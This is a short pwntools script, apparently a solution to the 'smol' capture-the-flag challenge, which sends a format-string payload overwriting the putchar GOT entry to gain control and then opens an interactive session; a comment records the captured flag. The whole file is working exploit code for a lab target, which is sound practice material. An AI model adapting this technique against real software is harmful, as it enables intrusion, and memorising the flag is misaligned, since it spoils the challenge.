#!/usr/bin/python3

from pwn import *

context.log_level = "debug"
p = remote("pwn.utctf.live", 5004)
filename = "./smol"
# p = process(filename)
e = ELF(filename)
# input()

magic = 0x401349
putc_got = e.got['putchar']
p.recvuntil(b"What kind of data do you have?")
payload = b"a"*0x70 + (b"%" + str(magic).encode() + b"c%22$ln").ljust(0x10, b"\x00")
payload += p64(putc_got)
# input()
p.sendline(payload)
p.recvuntil(b"Give me your data\n")
p.sendline(b"jiaranhiheijiaran")

p.interactive()
# utflag{just_a_little_salami15983350}
